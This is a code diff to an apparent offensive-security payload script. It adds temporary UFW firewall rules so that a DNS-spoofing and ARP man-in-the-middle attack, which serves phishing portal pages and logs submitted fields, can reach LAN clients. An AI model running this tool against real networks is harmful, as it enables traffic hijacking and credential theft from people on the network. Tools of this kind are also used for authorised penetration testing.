@@ -35,6 +35,7 @@ from payloads._iface_helper import list_interfaces
 from payloads._portal_content import (
     allowed_submission_fields, append_event, discover_templates, template_handler,
 )
+from payloads._ufw import TemporaryUfwRules
 from payloads._web_input import request_input
 
 LOCAL_DNS_PORT = 53535
@@ -286,10 +287,24 @@ def main() -> int:
     previous_handlers = {}
     redirect_added = False
     forwarding_changed = False
+    firewall = TemporaryUfwRules("dns-spoof")
     stop_event.clear()
     try:
+        local_address = next(
+            (
+                item.get("ip") for item in list_interfaces("any")
+                if item.get("name") == interface and item.get("ip")
+            ),
+            None,
+        )
+        if not local_address:
+            raise RuntimeError(f"{interface} has no usable local IPv4 address")
+        firewall.allow_lan_service(local_address, LOCAL_DNS_PORT, "udp")
+        firewall.allow_outbound(interface, "udp", upstream, 53)
         server.bind(("0.0.0.0", LOCAL_DNS_PORT))
         if template_path:
+            firewall.allow_lan_service(local_address, 443, "tcp")
+            firewall.allow_lan_service(local_address, 80, "tcp")
             handler = template_handler(
                 template_path, log_path, selected_template.get("submission_fields", []),
             )
@@ -379,6 +394,7 @@ def main() -> int:
             https_thread.join(timeout=3)
         if http_redirect_thread:
             http_redirect_thread.join(timeout=3)
+        firewall.close()
         stop_process(arp_client)
         stop_process(arp_gateway)
         if redirect_added:
